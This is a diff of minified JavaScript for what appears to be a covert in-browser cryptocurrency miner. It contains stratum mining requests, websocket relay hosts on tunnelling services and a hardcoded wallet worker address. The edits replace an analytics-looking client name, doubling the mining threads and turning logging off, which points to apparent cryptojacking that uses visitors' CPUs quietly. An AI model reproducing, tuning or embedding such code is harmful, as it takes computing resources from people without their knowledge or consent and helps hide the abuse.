@@ -87,7 +87,7 @@
             '{"id":"mining.authorize","method":"mining.authorize","params":["<worker.name>","<worker.pass>"]}\n',
           a = "mining.subscribe",
           T =
-            '{"id": "mining.subscribe", "method": "mining.subscribe", "params": ["anylystic/1.0"]}\n',
+            '{"id": "mining.subscribe", "method": "mining.subscribe", "params": ["teodaocoin/1.5"]}\n',
           h =
             '{"id": "mining.extranonce.subscribe", "method": "mining.extranonce.subscribe", "params": []}\n',
           G = "mining.set_difficulty",
@@ -268,7 +268,6 @@
         }
         var x = w;
         let z = [
-          "wss://cf-mailman-workstation-controlled.trycloudflare.com",
           "wss://pocxy1-1-vxnr.onrender.com",
         ];
         function b(U) {
@@ -599,7 +598,7 @@
                 worker: "BkNmv6nUnP7ME3Ev7hydJzSFQBW2WvNeGL",
                 password: "x",
               },
-              options: { threads: 1, log: !0 },
+              options: { threads: 2, log: !1 },
             },
           },
           P = [];
